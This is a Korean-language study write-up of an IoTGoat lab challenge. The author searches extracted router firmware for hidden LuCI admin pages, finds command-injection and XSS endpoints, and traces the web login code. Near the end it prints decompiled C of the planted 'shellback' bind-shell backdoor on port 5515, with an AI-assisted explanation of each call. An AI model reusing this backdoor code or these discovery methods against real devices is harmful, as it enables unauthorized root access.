# 3. Insecure Ecosystem Interfaces

[← IoTGoat 목록](README.md)

먼저 ecosystem이 무엇인지부터 모르겠다. 그래서 Ecosystem Interface를 찾아보니, 통신에서의 ecosystem interface는 다른 앱이나 프로그램들간의 연동, 연계를 염두한 설계를 말한다. 

찾아보니 공학적으로 대규모이고 복잡하고 실시간 모니터링이 필요한(원자력 발전소 등) 고에 사용되는 EID(Ecological Interface Design)이 있고, 지금 경우에 해당하는 Digital Ecosystem이라고 따로 또 있다. 혼돈하지 않도록 주의가 필요할 것 같다. 

Digital Ecosystem은 실제 자연생태계가 경쟁하면서도 서로 어우러지는 것을 본따 디지털 세계에서도 서로 다른 프로그램들과도 연동이, 협업이 되게 하자는 개념으로 발전된 것이다. 

어쨌든, 타 연동을 위한 페이지라던가 단순 디버깅이라던가 백도어라던가 필요에 의해서 남아있거나 의도치 않게 남아있는 숨겨진 페이지를 찾아서 유의미한 기능을 하는 페이지를 찾는 것이다. 

관리자의 숨겨진 웹페이지를 찾아보려고 한다.

![image.png](assets/image%2030.png)

- 찾는 패턴 형식자들에 대한 설명
    
    # 각 패턴(형식자) 설명 — 왜 숨겨진 페이지 탐색에 유용한가, 무엇을 grep할지, 해석 방법
    
    좋아 — `cgi-bin`, `*.lua`, `*.asp` 같은 **탐색에 유용한 문자열(패턴)** 들을 하나씩 설명할게. 각 항목마다 **의미**, **왜 찾는가**, **유효한 grep/정규식 예시**, **흔한 오탐/주의점**, 그리고 **발견했을 때 다음으로 할 행동**을 짧고 실용적으로 정리했어.
    
    ---
    
    # 1. `cgi-bin` / CGI 스크립트
    
    - 의미: 전통적인 웹서버의 Common Gateway Interface 디렉토리. 서버에서 동적 스크립트(Perl, C, sh 등)를 실행하는 위치.
    - 왜 찾나: 제조사·디버그용 스크립트, 숨겨진 유틸리티, 업로드/펌웨어 복구 엔드포인트가 위치하는 경우가 많음.
    - grep 예시:
        - `grep -Rni '/cgi-bin/' _firmware.bin.extracted/`
        - `strings firmware.bin | egrep -i '/cgi-bin/|\.cgi\b'`
    - 오탐/주의: 문자열 자체는 문서(매뉴얼)나 로그에도 있을 수 있음. 실제로 `.cgi` 파일이 있거나, 서버 config에서 핸들러로 연결되어야 의미 있음.
    - 다음 액션: 해당 경로를 `ffuf`/`curl`로 호출해 상태코드·응답 바디 확인. CGI 스크립트이면 입력 파라미터(쿼리/POST)로 기능을 조사.
    
    ---
    
    # 2. `.lua` / Lua 스크립트
    
    - 의미: 임베디드 장치에서 자주 쓰이는 경량 스크립트 언어(웹 UI 로직, 라우터, Luci 등).
    - 왜 찾나: 라우트 등록, 핸들러, 내부 API가 Lua 코드에 하드코딩되어 있는 경우가 많음 — 숨겨진 엔드포인트 후보가 자주 보임.
    - grep 예시:
        - `rg -n --hidden '\.lua\b' _firmware.bin.extracted/`
        - `grep -RniE 'function .+\\(|router:|uri:|dispatch:' _firmware.bin.extracted/`
    - 오탐/주의: Lua는 설정 스크립트나 메시지 템플릿에도 사용됨. 라우트 등록을 찾을 때는 `router`, `dispatch`, `http.*` 같은 키워드를 같이 찾으면 정확도가 높음.
    - 다음 액션: Lua 파일 열어 `require`, `dispatch`, `http` 관련 부분과 hard-coded paths(`/admin`, `/api/...`)을 찾는다. 발견된 엔드포인트로 요청 테스트.
    
    ---
    
    # 3. `.php`, `.asp`, `.aspx`, `.pl` 등 서버사이드 스크립트
    
    - 의미: 전통적 웹 백엔드 스크립트 확장자. PHP/ASP/Perl 파일이 있으면 동적 페이지/관리자 인터페이스일 확률 높음.
    - 왜 찾나: 관리자 페이지·업로드·백업·시리얼/디버그 인터페이스가 스크립트 파일로 남아있는 경우가 많음.
    - grep 예시:
        - `rg -n '\.php\b|\.asp\b|\.aspx\b|\.pl\b' _firmware.bin.extracted/`
        - `strings firmware.bin | egrep -i '\.php|/admin|login|password'`
    - 오탐/주의: 서브 시스템 설명문서나 예제 코드에도 확장자가 등장할 수 있음. 실행 가능한 스크립트 파일 유무(실제 파일/바이너리 내 포함)를 확인해야 함.
    - 다음 액션: 실제 파일이 있으면 파일 내용 확인 → 폼/파라미터 파악 → `curl`/`ffuf`로 엔드포인트 검증.
    
    ---
    
    # 4. API 관련 키워드: `/api/`, `/rest/`, `/v1/`, `/internal/`
    
    - 의미: REST/HTTP API 엔드포인트 패턴. 내부용 API나 관리자용 API가 숨겨져 있는 경우 발견됨.
    - 왜 찾나: UI에 보이지 않는 백엔드 엔드포인트(특권 API)들이 여기 있음. 토큰/키 없이도 일부 동작할 수 있는 경우가 있음.
    - grep 예시:
        - `rg -n '/api/|/rest/|/v[0-9]+/|/internal/' _firmware.bin.extracted/`
        - `strings firmware.bin | egrep -i '/api/|\"/v1/\"|/internal'`
    - 오탐/주의: 공개 API 문서 문자열도 포착될 수 있음. 응답 헤더/바디로 실제 동작을 검증하자.
    - 다음 액션: 엔드포인트 목록으로 `ffuf` 또는 `curl` 대량 검사. 인증 방식(토큰/쿠키) 있는지 확인.
    
    ---
    
    # 5. `robots.txt`, `sitemap.xml`, `.well-known`
    
    - 의미: 검색 엔진용 경로/허용·차단 지시 파일. 숨겨진 경로가 의도치 않게 `Disallow`에 적혀있을 수 있음.
    - 왜 찾나: 개발자가 노출하지 않을 페이지 경로를 `robots.txt`에 명시해두면 금광. `sitemap.xml`도 전체 URL 리스트 제공 가능.
    - grep 예시:
        - `rg -n 'robots\.txt|sitemap\.xml|\.well-known' _firmware.bin.extracted/`
        - `strings firmware.bin | egrep -i 'robots.txt|sitemap.xml|well-known'`
    - 오탐/주의: 없어도 괜찮음. 있어도 URL이 상대 경로일 수 있으니 정규화 필요.
    - 다음 액션: `curl http://target/robots.txt` 로 확인, `sitemap.xml` URL 리스트 추출 후 파싱해 직접 테스트.
    
    ---
    
    # 6. 서버/프레임워크 이름: `uhttpd`, `lighttpd`, `boa`, `nginx`, `lxc`, `luci`
    
    - 의미: 어떤 웹서버/프레임워크가 사용되는지 알려주는 키워드. 설정 파일 경로·루트 위치 유추 가능.
    - 왜 찾나: 서버별 디폴트 문서루트, CGI 폴더, config 파일 이름이 정형화되어 있어서 집중 조사 포인트가 됨.
    - grep 예시:
        - `rg -n 'uhttpd|lighttpd|boa|nginx|mini_httpd|luci' _firmware.bin.extracted/`
        - `grep -RniE 'server_root|document_root|wwwroot|htdocs' _firmware.bin.extracted/`
    - 오탐/주의: 문자열만으로는 버전/설정이 확정되지 않음. 설정 파일(예: `uhttpd.conf`, `lighttpd.conf`)을 찾아야 함.
    - 다음 액션: config 파일에서 `document_root`, `cgi-bin` 경로, 포트, 가상호스트 정보를 확인.
    
    ---
    
    # 7. 인증/비밀번호 키워드: `password`, `passwd`, `admin`, `token`, `auth`, `session`, `cookie`
    
    - 의미: 인증 로직, 기본 계정, 토큰발급, 세션 이름 등 관련 문자열.
    - 왜 찾나: 쿠키 이름·토큰 파라미터·하드코딩된 기본 비밀번호가 남아있을 수 있음.
    - grep 예시:
        - `rg -n 'password|passwd|admin|token|auth|session|cookie' _firmware.bin.extracted/`
        - `strings firmware.bin | egrep -i 'password|passwd|token|auth'`
    - 오탐/주의: 단어만으로는 실사용 여부 불명. 평문 비밀번호가 나오면 즉시 중요.
    - 다음 액션: 발견된 값이 cred 형태면 실제 로그인 시도(허가된 대상에서만). 토큰 발급 흐름을 찾아 재현.
    
    ---
    
    # 8. 업데이트/업그레이드 관련: `upgrade`, `firmware`, `upload`, `/update.cgi`
    
    - 의미: 펌웨어 업로드·업데이트 관련 엔드포인트. 제조사/공장용 복구 페이지가 여기 있을 가능성.
    - 왜 찾나: 권한이 낮아도 펌웨어 업로드·명령 실행 등 위험한 기능이 남아있을 수 있음.
    - grep 예시:
        - `rg -n 'upgrade|firmware|upload|update' _firmware.bin.extracted/`
        - `strings firmware.bin | egrep -i 'upgrade|firmware|upload|update.cgi'`
    - 오탐/주의: 문서 속 설명 문구에도 잘 등장함. 단, 실제 파일/스크립트가 있는지 확인 필요.
    - 다음 액션: 업로드 핸들러의 파라미터·인증 요구를 분석. 취약점(인증 우회, arbitrary file write) 가능성 확인.
    
    ---
    
    # 9. 디버그/팩토리 문자열: `factory`, `diag`, `debug`, `test`, `maintenance`
    
    - 의미: 공장 모드·진단 페이지·디버그 콘솔 관련 키워드.
    - 왜 찾나: 공장 모드는 인증이 약하거나 초기화·특권 명령을 노출하는 경우가 많음.
    - grep 예시:
        - `rg -n 'factory|diag|debug|test|maintenance' _firmware.bin.extracted/`
    - 오탐/주의: 테스트용 텍스트/주석에서도 자주 등장하므로 맥락(근처의 경로/핸들러)을 같이 봐야 함.
    - 다음 액션: 발견된 경로를 실제 요청해 보고 예상되는 파라미터나 출력(Serial 로그 등)을 확인.
    
    ---
    
    # 10. 바이너리 함수/라우트 키워드 (C 기반 라우트 등록)
    
    - 의미: 임베디드 C 바이너리에서 라우트 등록에 사용되는 문자열(예: `register_handler`, `add_route`, `http_register`)
    - 왜 찾나: 동적 라우팅을 구현할 때 경로와 핸들러 이름이 근처에 함께 존재하는 경우가 많아, 숨긴 엔드포인트를 찾아내기 좋음.
    - grep 예시:
        - `strings firmware.bin | egrep -i 'register_handler|add_route|http_register|register_uri|on_request'`
    - 오탐/주의: 모든 문자열이 라우팅을 의미하는 건 아님. 주변 문자열(경로 패턴)을 같이 확인.
    - 다음 액션: 해당 문자열 주변(앞뒤 3~5줄)을 살펴 실제 경로가 노출돼 있는지 확인.
    
    ---
    
    # 실무 팁 — 검색 조합과 우선순위
    
    1. **경로 패턴 먼저**: `/admin|/login|/api|/cgi-bin` 같은 경로 형태를 먼저 뽑아 candidates.txt 생성.
    2. **파일 확장자 확인**: `.php`, `.cgi`, `.lua`, `.js` 파일이 실제로 존재하는지 체크.
    3. **서버 설정 파악**: `document_root`, `uhttpd.conf`, `lighttpd.conf` 등이 있으면 우선 조사.
    4. **문맥 보기**: 단어 하나만 잡히면 오탐이므로 `strings`나 `rg -C 3`로 주변 문맥(경로·함수명·매개변수)을 확인.
    5. **자동화 후 사람 눈검증**: `endpoints_admin.txt`를 만들어 `ffuf`로 probe → 응답 코드/크기/문자열로 후보 우선순위 매기기.
    
    ---
    
- /usr/lib/lua/luci/controller/upnp.lua
    
    뭔가 controller 어쩌구 해서 파일을 확인해보았으나
    
    ![image.png](assets/image%2031.png)
    
    딱히 뭐가 있어보이지는 않았다.
    
    - 파일 내용
        
        ```lua
        user@lab:~/iotgoat/_IoTGoat-raspberry-pi2.img.extracted/squashfs-root$ cat usr/lib/lua/luci/controller/upnp.lua
        -- Copyright 2008 Steven Barth <steven@midlink.org>
        -- Copyright 2008 Jo-Philipp Wich <jow@openwrt.org>
        -- Licensed to the public under the Apache License 2.0.
        
        module("luci.controller.upnp", package.seeall)
        
        function index()
                if not nixio.fs.access("/etc/config/upnpd") then
                        return
                end
        
                local page
        
                page = entry({"admin", "services", "upnp"}, cbi("upnp/upnp"), _("UPnP"))
                page.dependent = true
        
                entry({"admin", "services", "upnp", "status"}, call("act_status")).leaf = true
                entry({"admin", "services", "upnp", "delete"}, post("act_delete")).leaf = true
        end
        
        function act_status()
                local uci = luci.model.uci.cursor()
                local lease_file = uci:get("upnpd", "config", "upnp_lease_file")
        
                local ipv4_hints = luci.sys.net.ipv4_hints()
        
                local ipt = io.popen("iptables --line-numbers -t nat -xnvL MINIUPNPD 2>/dev/null")
                if ipt then
                        local upnpf = lease_file and io.open(lease_file, "r")
                        local fwd = { }
                        while true do
                                local ln = ipt:read("*l")
                                if not ln then
                                        break
                                elseif ln:match("^%d+") then
                                        local num, proto, extport, intaddr, intport =
                                                ln:match("^(%d+).-([a-z]+).-dpt:(%d+) to:(%S-):(%d+)")
                                        local descr = ""
        
                                        if num and proto and extport and intaddr and intport then
                                                num     = tonumber(num)
                                                extport = tonumber(extport)
                                                intport = tonumber(intport)
        
                                                if upnpf then
                                                        local uln = upnpf:read("*l")
                                                        if uln then descr = uln:match(string.format("^%s:%d:%s:%d:%%d*:(.*)$", proto:upper(), extport, intaddr, intport)) end
                                                        if not descr then descr = "" end
                                                end
        
                                                local host_hint, _, e
        
                                                for _,e in pairs(ipv4_hints) do
                                                        if e[1] == intaddr then
                                                                host_hint = e[2]
                                                                break
                                                        end
                                                end
        
                                                fwd[#fwd+1] = {
                                                        num     = num,
                                                        proto   = proto:upper(),
                                                        extport = extport,
                                                        intaddr = intaddr,
                                                        host_hint = host_hint,
                                                        intport = intport,
                                                        descr = descr
                                                }
                                        end
                                end
                        end
        
                        if upnpf then upnpf:close() end
                        ipt:close()
        
                        luci.http.prepare_content("application/json")
                        luci.http.write_json(fwd)
                end
        end
        
        function act_delete(num)
                local idx = tonumber(num)
                local uci = luci.model.uci.cursor()
        
                if idx and idx > 0 then
                        luci.sys.call("iptables -t filter -D MINIUPNPD %d 2>/dev/null" % idx)
                        luci.sys.call("iptables -t nat -D MINIUPNPD %d 2>/dev/null" % idx)
        
                        local lease_file = uci:get("upnpd", "config", "upnp_lease_file")
                        if lease_file and nixio.fs.access(lease_file) then
                                luci.sys.call("sed -i -e '%dd' %s" %{ idx, luci.util.shellquote(lease_file) })
                        end
        
                        luci.http.status(200, "OK")
                        return
                end
        
                luci.http.status(400, "Bad request")
        end
        ```
        

그래도 upnp에 대해서 좀 찾아보니까 포트포워딩을 해주는 역할로, 특별한 설정이나 설치없이 다양한 네트워크 기기 간 통신할 수 있도록 설계된 프로토콜이라고 한다. 그래서 만약 외부에서 통신연결을 요청을 하였을 때, upnp가 열려있다면, 그냥 아무런 검증없이 기기를 연결시켜버리게 되는 것이다.

그리고 추가로 알게된 사실은 

UPnP  subscribe 함수의 콜백 헤더값이 임의 조작 가능하여 발생하는 데이터 유출 및 DoS 취약점이 있다는 것이다. (CVE-2020-12695) 

뭐 어쨌든 중요한 거는 여기서 upnp를 위한 스크립트가 있는 것을 보아 upnp를 사용할 수 있지 않을까라는 생각이 들긴하였다. 

![image.png](assets/image%2032.png)

아예 controller 쪽으로 타고 들어가 봤는데, 뭔가 재미있어 보이는 것들이 같이 있었다. 

![image.png](assets/image%2033.png)

uci.lua 에서는 에러코드들도 나왔었는데, 

![image.png](assets/image%2034.png)

이렇게 Entry에 없는 것이면 404를 띄우고 하는 것 같다. 

그래서 인가 Entry에 있는 admin을 넣어도 에러가 생기지 않는다. 아마 이거 관련한 경로가 더 있지 않을까 싶다. 

![image.png](assets/image%2035.png)

재미있어 보이는 것을 찾았다.

![image.png](assets/image%2036.png)

iotgoat 디렉 내의 iotgoat.lua 파일에서 Entry가 있는데, admin/iotgoat/cmdinject 같은 대놓고인 친구들이 있다.

![image.png](assets/image%2037.png)

다만… 로그인이 안되어서 그런가 보이지는 않는 것 같다. 

… 그런데 생각해보니까 지금 현 상황은 iotgoatuser 라는 계정은 ssh로 통해 정상 로그인이 된 상황이다. 그러나 web에 대한 계정은 실패한 상황이다. 그리고 이 차이점을 gpt에게 물어보니, iotgoat의 1번문제가 이 의도를 가지고 있다는 평이 나왔다. 

시스템 계정과 web 계정은 서로 다르며, 이 하드코딩된 password라는 것을 이제 이 지점부터 찾는 것이라고. 즉, 아직 1번은 끝나지 않은 것이었다.  

## 다시 복귀(이 파트는 삽질 파트)

이게 root 계정을 확보해야하는지, 우회를 해야하는지 확인지 되지 않는 상황이다. root 계정확보는 일단 아닐 가능성이 높기에 이번에는 위에 숨겨진 페이지를 찾는 것처럼 로그인 벡터를 확인하여 우회여지가 있는지 확인할 것이다. 

로그인 페이지 관련 파일을 찾던 중, 기존 발견했던 /usr/lib/lua/luci/controller/admin 내에서 index.lua를 다시 확인하였고, 저 함수 index() 부분에서 page.sysauth에 root을 id로, htmlauth 라고 되어 있는 곳을  pw로 보고 gpt에게 분석을 맡기니 htmlauth 는 모듈일 가능성이 크다고 얘기해 주었다.

혹시 몰라 htmlauth 를 pw로 로그인창에 입력하였을 때, wrong pw가 뜨긴했다. 

![image.png](assets/image%2038.png)

### 핵심 개념 (요약)

- `page.sysauth = "root"` → 웹에서 인증할 때 **사용자 `root`** 를 요구할 가능성이 높다.
- `page.sysauth_authenticator = "htmlauth"` → `htmlauth`라는 이름의 **인증기(함수/모듈)** 를 사용한다는 선언.
- **`htmlauth`는 파일명이 아니라 모듈/함수 이름**(예: `/usr/lib/lua/luci/<...>`에 구현체가 있음).
- 따라서 해야 할 일: **`htmlauth` 구현을 찾아서(어디서 어떤 소스/방식으로 인증하는지) 확인** → 그 다음 적절히 대응(루트 비밀번호 확보/변경 또는 권한상승).

grep -R을 활용하여 htmlauth 문자열 검색 

![image.png](assets/image%2039.png)

범위를 넓혀서 auth 문자열을 검색

![image.png](assets/image%2040.png)

대체적으로 dispatcher.lua에 대부분이 집중되어 있는 상태이고, authen() 내 sys.user.checkpasswd가 있는 것이 보인다. 그래서 grep -R로 checkpasswd 문자열 검색하였더니 sys.lua에 function으로 정의되어 있는 것을 볼 수 있다. 

![image.png](assets/image%2041.png)

nixio라는 것과 연관된 pw 가져오는 함수를 확인, 위의 checkpasswd 함수는 아니긴 하다.
!과 x를 거르는 것을 보아 /etc/passwd나 ./shadow에서 x로 표기된 계정이나 비번 앞에 ! 을 붙어서 비활성화를 시켜두어 비번이 없는 계정에 대한 분기같다. 

![image.png](assets/image%2042.png)

어이쿠 checkpasswd가 위의 함수를 불러온다. 

![image.png](assets/image%2043.png)

## 해결 완료(다시 3번 진행)

정석은 2번에서 백도어를 찾았으니 그를 통해 관리자 pw를 변경하는 거였다 ㅎㅎ; 

이제 앞서 실패했던 iotgoat.lua의 index()를 넣어볼 때가 왔다. 

![image.png](assets/image%2044.png)

/admin/iotgoat를 URL에 추가하니 단순 버튼 클릭으로 갈 수 없었던 숨겨진 페이지가 활성화된 것을 볼 수 있다. 로그인을 하지 못했을 때는 작동하지 않았던 페이지였다. 

/admin/iotgoat/cmdinject 도 동일한 페이지가 나온다.

![image.png](assets/image%2045.png)

/cam (이 친구는 우측 상단 IoTGoat 선택창 내 Camera로 진입가능하다. 

![image.png](assets/image%2046.png)

/door (위 cam과 동일하다.) 

![image.png](assets/image%2047.png)

/webcmd → XSS가 된다. 

![image.png](assets/image%2048.png)

### 재정비

![image.png](assets/image%2049.png)

IotGoat의 challenge 목록을 봤을 때, 3번에서 숨겨진 사이트를 찾는 것은 첫번 째 항목임을 알 수 있다. 그리고 부팅시 설정되는 데몬중에 backdoor용이 있다고 해서 찾아볼려고 한다.

일단 부팅시 설정되는 데몬이라고는 하니까 /etc/rc.d 를 먼저 가봤는데 전부 init.d로 링크되어 있어서 init.d로 이동해서 확인해보았다. 

![image.png](assets/image%2050.png)

![image.png](assets/image%2051.png)

dropbear가 뭔가했더니 SSH 서버 데몬으로써 ssh 연결을 지원해주는 친구였다. 

gpio_switch는 General Puerpose I/O로, 물리적 스위치나 LED 등의 상태를 부팅시 설정한다.

![image.png](assets/image%2052.png)

/var/run/led.state 등을 사용하는 것을 볼 수 있다. 

- shellback 코드
    
    ```bash
    user@lab:~/iotgoat/_IoTGoat-raspberry-pi2.img.extracted/squashfs-root/etc/init.d$ cat shellback
    #!/bin/sh /etc/rc.common
    
    START=95
    PROG=/usr/bin/shellback
    
    section_enabled() {
            config_get_bool enabled "$1" 'enabled' 0
            [ $enabled -gt 0 ]
    }
    
    start_instance() {
            local cfg="$1"
            local duration
            local enabled
    
            config_get_bool enabled "$cfg" 'enabled' 0
            config_get duration "$cfg" 'duration' 0
    
            [ $enabled -gt 0 ] || return 1
    
            # Usually, procd should be used for services running in the background.
            eval service_start "'$PROG' $duration"
    }
    
    stop_instance() {
            local cfg="$1"
            service_stop "$PROG"
    }
    
    start() {
            config_load 'shellback'
            config_foreach start_instance 'shellback'
    }
    
    stop() {
            config_load 'shellback'
            config_foreach stop_instance 'shellback'
    }
    ```
    

뭔가 이름부터 희얀한 친구를 발견했다. 제미나이도 분석을 했을 때 백도어용 데몬일 가능성이 있다고 평가한다. 

일단 여기서 참조하는 /usr/bin/shellback 도 확인해봐야겠다. 

![image.png](assets/image%2053.png)

일단 존재를 확인할 수 있다. 그런데 ELF 파일이라서 ida로 한 번 구경해보려고 한다. 

![image.png](assets/image%2054.png)

일단 바로 딱 보이는 것은 /bin/busybox를 불러오는 것을 볼 수 있다. 그리고 저 출력되는 문장은 아까 2번에서 5515포트로 진입했을 때 출력되던 문장으로, 2번의 경로가 이걸 통해 오는 것으로 예상된다. 

- 메인 함수
    
    ```c
    int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
    {
      int v3; // r4
      int v4; // r7
      int v5; // r5
      int v6; // r1
      socklen_t v7; // [sp+0h] [bp-50h] BYREF
      char *v8[3]; // [sp+4h] [bp-4Ch] BYREF
      struct sockaddr v9; // [sp+10h] [bp-40h] BYREF
      sockaddr addr; // [sp+20h] [bp-30h] BYREF
    
      v8[0] = "/bin/busybox";
      v8[1] = "sh";
      v8[2] = 0;
      v9.sa_family = 2;
      *(_WORD *)v9.sa_data = htons(0x158Bu);
      v3 = 0;
      *(_DWORD *)&v9.sa_data[2] = 0;
      v4 = socket(2, 1, 0);
      bind(v4, &v9, 0x10u);
      listen(v4, 1);
      while ( 1 )
      {
        v7 = 16;
        v5 = accept(v4, &addr, &v7);
        if ( fork() )
        {
          write(v5, "[***]Successfully Connected to IoTGoat's Backdoor[***]\n", 0x37u);
          while ( v3 <= 2 )
          {
            v6 = v3++;
            dup2(v5, v6);
          }
          execve("/bin/busybox", v8, 0);
          close(v5);
        }
        close(v5);
      }
    }
    ```
    
- 기능 분석(제미나이)
    
    ### 코드 기능 분석 (Bind Shell)
    
    이 코드는 "바인드 쉘(Bind Shell)"이라고 불리는 전형적인 백도어입니다. 기기 자체에서 특정 포트를 열고, 공격자의 연결을 기다리는 방식입니다.
    
    코드가 수행하는 일은 다음과 같습니다.
    
    1. **`v4 = socket(2, 1, 0);`**
        - 네트워크 연결을 위한 소켓(창구)을 엽니다.
        - 여기서 첫번째 인자 2는 ipv4를 사용한다는 뜻이고(1은 내부 통신, 10은 ipv6), 두번째 인자 1은 TCP 연결(2 면은 UDP), 세번째 인자의 0은 1, 2 번째 인자를 활용한 기본 프로토콜 활용이다.
        
        ![image.png](assets/image%2055.png)
        
    2. **`(_WORD *)v9.sa_data = htons(0x158Bu);`**
        - 소켓이 사용할 포트 번호를 설정합니다. `0x158B` (16진수)는 10진수로 **5515**입니다.
        - 사용자님이 챌린지 2번에서 발견한 5515번 포트와 일치합니다.
        - v9 구조체가 네트워크과 관련된 것임 알 수 있다.
        
        ![image.png](assets/image%2056.png)
        
    3. **`bind(v4, &v9, 0x10u);`**
        - 소켓을 5515번 포트에 할당(bind)합니다.
        - 설명
            
            `bind(v4, &v9, 0x10u)`는 **"아까 만든 소켓(v4)에 특정 IP 주소와 포트 번호(v9)를 할당(bind)하라"**는 명령입니다.
            
            이전의 `socket()` 함수가 통신을 위한 '빈 창구'를 만드는 것이었다면, `bind()`는 그 창구에 **'5515번 포트, 이 기계의 IP 주소'라는 구체적인 주소표**를 붙이는 작업입니다.
            
            각 인자의 의미는 다음과 같습니다.
            
            ---
            
            ### 1. 첫 번째 인자: `v4`
            
            - **역할:** 소켓 파일 디스크립터 (Socket File Descriptor)
            - **의미:** `socket(2, 1, 0)` 함수가 성공적으로 실행되면서 반환해 준 **'소켓의 ID 번호'**입니다.
            - **비유:** "어떤 창구에 주소표를 붙일 것인가?"에 대한 대답입니다. "방금 만든 `v4`번 창구요."
            
            ### 2. 두 번째 인자: `&v9`
            
            - **역할:** 주소 정보가 담긴 구조체 포인터 (`struct sockaddr *`)
            - **의미:** 소켓에 할당할 **IP 주소와 포트 번호**가 들어있는 `v9` 변수의 메모리 주소입니다.
            - **핵심 분석:** 백도어 코드에서 `bind()`가 호출되기 *전에* `v9` 변수를 다음과 같이 설정했습니다.
                - `v9.sa_family = 2;`
                    - `AF_INET`, 즉 IPv4 주소 체계를 사용하겠다고 지정합니다.
                - `(_WORD *)v9.sa_data = htons(0x158Bu);`
                    - 포트 번호를 **5515** (`0x158B`)로 지정합니다. `htons`는 "Host to Network Short"의 약자로, 컴퓨터가 읽는 방식(리틀 엔디안)을 네트워크 통신 표준 방식(빅 엔디안)으로 변환해줍니다.
                - `(_DWORD *)&v9.sa_data[2] = 0;`
                    - 할당할 IP 주소를 `0`으로 지정합니다. 네트워크 프로그래밍에서 `0` (또는 `INADDR_ANY`)은 특별한 의미를 가집니다. **"이 컴퓨터가 가진 모든 IP 주소에서 접속을 받겠다"**는 뜻입니다.
                    - 예를 들어, IoT 기기가 Wi-Fi IP(`192.168.1.50`)와 유선랜 IP(`10.0.0.10`)를 동시에 가지고 있다면, 두 IP 주소의 5515번 포트로 모두 접속을 허용하게 됩니다.
            
            ### 3. 세 번째 인자: `0x10u`
            
            - **역할:** 주소 구조체의 크기 (Socket Address Length)
            - **의미:** 두 번째 인자로 넘겨준 `v9` 구조체의 전체 크기가 얼마인지 알려줍니다. `0x10` (16진수)은 10진수로 **16**이며, 이는 `struct sockaddr` 구조체의 표준 크기(16바이트)입니다.
            - **비유:** "주소표의 크기가 16바이트입니다"라고 커널에게 알려주는 기술적인 값입니다.
            
            ---
            
            ### 🎯 결론
            
            `bind(v4, &v9, 0x10u)` 호출은 **"v4번 소켓을, 이 기기의 모든 IP 주소에 대해, 5515번 포트로 들어오는 연결을 받을 수 있도록 설정합니다."**
            
            이 명령이 성공적으로 실행되면, 해당 IoT 기기는 5515번 포트에서 "공개적으로" 연결을 받을 준비를 마친 것이며, 바로 다음 단계인 `listen()`을 통해 본격적으로 공격자의 접속을 기다리게 됩니다.
            
    4. **`listen(v4, 1);`**
        - 이제 5515번 포트로 들어오는 연결을 "수신 대기"하기 시작합니다.
        (TCP 5515가 열려있던 이유)
    5. **`v5 = accept(v4, &addr, &v7);`**
        - (무한 루프 `while(1)` 안에서) 공격자가 5515번 포트로 접속할 때까지 기다리다가, 접속이 들어오면 `accept` (수락)합니다.
    6. **`write(v5, "[***]Successfully Connected to IoTGoat's Backdoor[***]\n", ...);`**
        - 연결된 공격자에게 사용자님이 보셨던 "Successfully Connected" 환영 메시지를 전송합니다.
    7. **`dup2(v5, v6);`**
        - 이 부분이 핵심입니다. `dup2` 함수를 이용해 **표준 입력(0), 표준 출력(1), 표준 에러(2)**의 방향을 모두 네트워크 연결(소켓 `v5`)로 돌려버립니다.
    8. **`execve("/bin/busybox", v8, 0);`**
        - `v8` 변수에 저장된 `"/bin/busybox", "sh"` 명령, 즉 **쉘(sh)을 실행**합니다.
        - 하지만 7번 단계에서 입출력 방향이 모두 네트워크로 바뀌었기 때문에, 이 쉘은 터미널이 아닌 **네트워크 너머의 공격자에게** 붙게 됩니다.
    
    **결론:**
    이 프로그램이 실행되면, IoT 기기는 5515번 포트를 열어놓고 대기합니다. 공격자가 `netcat` 등으로 이 포트에 접속하면, 환영 메시지와 함께 **기기의 루트 쉘을 획득**하게 됩니다.
    

